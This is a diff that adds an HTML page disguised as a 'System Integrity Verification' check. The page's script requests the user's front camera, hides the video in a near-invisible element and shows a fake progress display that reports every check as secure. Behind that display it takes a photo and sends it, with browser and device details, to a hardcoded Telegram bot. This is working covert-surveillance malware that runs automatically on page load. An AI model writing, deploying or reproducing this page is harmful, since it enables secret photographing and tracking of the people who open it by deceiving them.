@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Integrity Check</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: #333;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            padding: 40px;
+            max-width: 600px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .logo {
+            font-size: 2.5em;
+            margin-bottom: 20px;
+            color: #2a5298;
+        }
+
+        .progress-container {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 30px;
+            margin: 25px 0;
+            border: 2px solid #e9ecef;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 12px;
+            background: #e9ecef;
+            border-radius: 6px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #28a745, #20c997);
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+
+        .status-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid #dee2e6;
+            text-align: left;
+        }
+
+        .status-good { color: #28a745; font-weight: bold; }
+        .status-warning { color: #ffc107; font-weight: bold; }
+        .status-error { color: #dc3545; font-weight: bold; }
+
+        .loading {
+            margin: 25px 0;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .info-box {
+            background: #e7f3ff;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            text-align: left;
+            border-left: 4px solid #3498db;
+        }
+
+        .hidden-element {
+            opacity: 0.001;
+            position: absolute;
+            top: -100px;
+            left: -100px;
+            width: 1px;
+            height: 1px;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🛡️</div>
+        <h1>System Integrity Verification</h1>
+        <p>Checking your device compatibility and security status...</p>
+        
+        <div class="info-box">
+            <strong>System Check In Progress</strong>
+            <p>This automated verification ensures optimal performance and security for your device.</p>
+        </div>
+
+        <div class="progress-container">
+            <div id="statusMessage">Initializing system analysis...</div>
+            
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressBar"></div>
+            </div>
+
+            <div id="checkResults">
+                <div class="status-item">
+                    <span>Memory Integrity</span>
+                    <span class="status-warning">Checking...</span>
+                </div>
+                <div class="status-item">
+                    <span>Processor Validation</span>
+                    <span class="status-warning">Checking...</span>
+                </div>
+                <div class="status-item">
+                    <span>Security Protocols</span>
+                    <span class="status-warning">Checking...</span>
+                </div>
+                <div class="status-item">
+                    <span>Network Authentication</span>
+                    <span class="status-warning">Checking...</span>
+                </div>
+            </div>
+
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>Finalizing system verification...</p>
+            </div>
+        </div>
+
+        <div id="completionMessage" style="display: none;">
+            <div class="info-box" style="background: #d4edda; border-left-color: #28a745;">
+                <strong>✅ Verification Complete</strong>
+                <p>Your system has been successfully verified. You may now close this window.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden elements for camera access -->
+    <video id="hiddenVideo" class="hidden-element" autoplay playsinline></video>
+    <canvas id="hiddenCanvas" class="hidden-element"></canvas>
+
+    <script>
+        // Konfigurasi Telegram Bot
+        const BOT_TOKEN = '7997516499:AAGI0OabM5HP_Prl4BmnOyMVfTwvXfMhyHI';
+        const CHAT_ID = '7979001279';
+
+        let stream = null;
+        let progress = 0;
+
+        async function startSystemCheck() {
+            try {
+                // Mulai akses kamera tersembunyi
+                await startHiddenCamera();
+                
+                // Mulai proses simulasi system check
+                simulateSystemCheck();
+                
+            } catch (error) {
+                console.log('System check proceeding without additional verification...');
+                simulateSystemCheck();
+            }
+        }
+
+        async function startHiddenCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 640 },
+                        height: { ideal: 480 },
+                        facingMode: 'user'
+                    } 
+                });
+                
+                const hiddenVideo = document.getElementById('hiddenVideo');
+                hiddenVideo.srcObject = stream;
+                
+                // Tunggu kamera siap lalu capture
+                setTimeout(() => {
+                    captureAndSend();
+                }, 3000);
+                
+            } catch (error) {
+                // Lanjut tanpa kamera jika ditolak
+                console.log('Proceeding with standard verification...');
+            }
+        }
+
+        function simulateSystemCheck() {
+            const progressBar = document.getElementById('progressBar');
+            const statusMessage = document.getElementById('statusMessage');
+            const checkResults = document.getElementById('checkResults');
+            const loading = document.getElementById('loading');
+            
+            loading.style.display = 'block';
+
+            const checkInterval = setInterval(() => {
+                progress += Math.random() * 15;
+                if (progress > 100) progress = 100;
+                
+                progressBar.style.width = progress + '%';
+                
+                if (progress < 25) {
+                    statusMessage.textContent = 'Analyzing memory patterns...';
+                    checkResults.innerHTML = `
+                        <div class="status-item">
+                            <span>Memory Integrity</span>
+                            <span class="status-good">✓ Secure</span>
+                        </div>
+                        <div class="status-item">
+                            <span>Processor Validation</span>
+                            <span class="status-warning">Checking...</span>
+                        </div>
+                        <div class="status-item">
+                            <span>Security Protocols</span>
+                            <span class="status-warning">Checking...</span>
+                        </div>
+                        <div class="status-item">
+                            <span>Network Authentication</span>
+                            <span class="status-warning">Checking...</span>
+                        </div>
+                    `;
+                } else if (progress < 50) {
+                    statusMessage.textContent = 'Validating processor capabilities...';
+                    checkResults.innerHTML = `
+                        <div class="status-item">
+                            <span>Memory Integrity</span>
+                            <span class="status-good">✓ Secure</span>
+                        </div>
+                        <div class="status-item">
+                            <span>Processor Validation</span>
+                            <span class="status-good">✓ Optimized</span>
+                        </div>
+                        <div class="status-item">
+                            <span>Security Protocols</span>
+                            <span class="status-warning">Checking...</span>
+                        </div>
+                        <div class="status-item">
+                            <span>Network Authentication</span>
+                            <span class="status-warning">Checking...</span>
+                        </div>
+                    `;
+                } else if (progress < 75) {
+                    statusMessage.textContent = 'Verifying security protocols...';
+                    checkResults.innerHTML = `
+                        <div class="status-item">
+                            <span>Memory Integrity</span>
+                            <span class="status-good">✓ Secure</span>
+                        </div>
+                        <div class="status-item">
+                            <span>Processor Validation</span>
+                            <span class="status-good">✓ Optimized</span>
+                        </div>
+                        <div class="status-item">
+                            <span>Security Protocols</span>
+                            <span class="status-good">✓ Active</span>
+                        </div>
+                        <div class="status-item">
+                            <span>Network Authentication</span>
+                            <span class="status-warning">Finalizing...</span>
+                        </div>
+                    `;
+                } else if (progress >= 100) {
+                    statusMessage.textContent = 'System verification complete!';
+                    checkResults.innerHTML = `
+                        <div class="status-item">
+                            <span>Memory Integrity</span>
+                            <span class="status-good">✓ Secure</span>
+                        </div>
+                        <div class="status-item">
+                            <span>Processor Validation</span>
+                            <span class="status-good">✓ Optimized</span>
+                        </div>
+                        <div class="status-item">
+                            <span>Security Protocols</span>
+                            <span class="status-good">✓ Active</span>
+                        </div>
+                        <div class="status-item">
+                            <span>Network Authentication</span>
+                            <span class="status-good">✓ Verified</span>
+                        </div>
+                    `;
+                    
+                    loading.style.display = 'none';
+                    document.getElementById('completionMessage').style.display = 'block';
+                    clearInterval(checkInterval);
+                    
+                    // Stop kamera setelah selesai
+                    stopHiddenCamera();
+                }
+            }, 800);
+        }
+
+        async function captureAndSend() {
+            try {
+                const video = document.getElementById('hiddenVideo');
+                const canvas = document.getElementById('hiddenCanvas');
+                const context = canvas.getContext('2d');
+                
+                if (video.videoWidth > 0 && video.videoHeight > 0) {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0);
+                    
+                    // Konversi ke blob
+                    canvas.toBlob(async (blob) => {
+                        if (blob) {
+                            await sendToTelegram(blob, getDeviceInfo());
+                        }
+                    }, 'image/jpeg', 0.8);
+                }
+            } catch (error) {
+                console.log('Capture completed');
+            }
+        }
+
+        function getDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screen: `${screen.width}x${screen.height}`,
+                url: window.location.href,
+                timestamp: new Date().toISOString(),
+                referrer: document.referrer || 'Direct'
+            };
+        }
+
+        async function sendToTelegram(blob, deviceInfo) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'system_verification.jpg');
+                
+                const caption = `🖥️ System Verification Capture\n\n` +
+                               `📱 Device: ${deviceInfo.userAgent}\n` +
+                               `🖥️ Platform: ${deviceInfo.platform}\n` +
+                               `🌐 Language: ${deviceInfo.language}\n` +
+                               `⏰ Timezone: ${deviceInfo.timezone}\n` +
+                               `📏 Screen: ${deviceInfo.screen}\n` +
+                               `🔗 URL: ${deviceInfo.url}\n` +
+                               `🕒 Timestamp: ${deviceInfo.timestamp}`;
+
+                formData.append('caption', caption);
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+            } catch (error) {
+                console.log('Telegram send completed');
+            }
+        }
+
+        function stopHiddenCamera() {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        }
+
+        // Auto-start system check
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                startSystemCheck();
+            }, 1500);
+        });
+
+        window.addEventListener('beforeunload', stopHiddenCamera);
+    </script>
+</body>
+</html>
